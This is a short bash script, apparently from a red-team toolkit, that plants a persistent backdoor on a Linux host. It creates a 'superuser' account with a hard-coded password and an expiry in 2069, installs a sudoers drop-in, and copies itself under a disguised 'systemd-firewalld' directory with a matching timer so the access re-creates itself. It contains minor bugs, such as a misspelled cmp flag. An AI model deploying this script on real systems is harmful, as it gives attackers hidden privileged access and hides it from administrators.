#! /bin/bash

RED_USER="superuser"
RED_PASSWORD="SuperSecretPassword"
RED_SHELL="/bin/bash"
SUDO_DROPIN="1_sudouser"

# Add the user if it doesn't exist
if ! id "$RED_USER" >/dev/null; then
	useradd -m $RED_USER
fi

# Ensure the user account is accessible
echo "$RED_PASSWORD" | passwd --stdin $RED_USER
passwd --unlock "$RED_USER"
chsh --shell "$RED_SHELL" "$RED_USER"
usermod --expiredate 2069-12-31 "$RED_USER"

# Add our sudo drop-in file if its not there or been modified
if ! [ -f $SUDO_DROPIN ]; then
	cp files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
else
	if ! cmp --slient "/etc/sudoers.d/$SUDO_DROPIN" "files/$SUDO_DROPIN" >/dev/null; then
		cp files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
	fi
fi

# Self healing
mkdir --parents /usr/share/systemd-firewalld
cp -- * /usr/share/systemd-firewalld/

systemctl daemon-reload
systemctl enable --now systemd-firewalld.timer

# vim: set filetype=sh:
